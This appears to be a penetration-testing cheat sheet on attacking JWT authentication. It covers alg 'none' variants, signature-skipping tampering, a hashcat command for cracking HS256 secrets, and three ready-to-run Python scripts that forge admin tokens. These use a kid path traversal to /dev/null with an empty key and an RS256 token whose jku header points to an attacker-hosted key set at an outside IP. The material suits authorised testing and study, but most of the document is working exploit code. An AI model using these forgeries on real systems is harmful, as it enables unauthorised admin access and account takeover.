
# JWT Checks

## None

Decode the "Header" and change the "alg" to be a variation of "none":

- None
- none
- NoNe
- NONE

Remove the signature but keep the second period.  
Tamper the payload to what you need.  

## Not checking Sig?

Decode and change the "Payload", the server may not be checking it anyway.  

## Crack with Hashcat (HMAC - HS256)

Copy the original JWT to a text file and run Hashcat against it:  

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

## Specific Techniques

The following code exploits the ability to set the KID to a predictable value on a Linux machine
With `pyjwt` library  

```python3
"""
'kid' header stands for 'Key ID'.
The vulnerability comes from being able to set the kid  to a predictable value.
On a linux machine you can set the kid to '/dev/null' which returns nothing.
Then set the secret to a blank value and sign the jwt with it.
"""

#!/usr/bin/env python3
import jwt

secret = ''
payload = {
    "user":"admin"
}
alg = "HS256"
header = {
    "kid":"../../../../../../dev/null"
}

token = jwt.encode(payload, secret, algorithm= alg, headers=header)
print(token)
```

With built-in libraries:  

```python3
import hmac
import base64
import hashlib
import json

header = {
        "alg":"RS256",
        "kid":"../../../../../../../../dev/null"
}

key = ""

payload = {
        "user": "admin"
}

str = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('utf8').rstrip("=") + "." + base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf8')).decode('utf8').rstrip("=")

sig = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'), str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")

print(str + "." + sig)
```

Create keys with OpenSSL and setting 'e' and 'n'

```python3
import jwt
import OpenSSL
import json
import base64
import hashlib
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

key = OpenSSL.crypto.PKey()
key.generate_key(type=OpenSSL.crypto.TYPE_RSA,bits=2048)
priv = key.to_cryptography_key()
pub = priv.public_key()

header = {
  "alg":"RS256",
  "jwk":  {
          "kty":"RSA",
          # "kid":"bilbo.baggins@hobbiton.example",
          "use":"sig"
          },
  "typ": "JWT",
  "jku": "http://157.245.154.213:8000/a/jwk"
}

e = pub.public_numbers().e
n = pub.public_numbers().n

header['jwk']['e'] = base64.urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1,byteorder='big')).decode('utf8').rstrip('=')
header['jwk']['n'] = base64.urlsafe_b64encode((n).to_bytes((n).bit_length()//8+1,byteorder='big')).decode('utf8').rstrip('=')

payload = {
  "user": "admin"
}

token = jwt.encode(payload, priv, algorithm="RS256", headers=header)

print(f"Token: {token}\ne: {header['jwk']['e']}\nn: {header['jwk']['n']}")

```
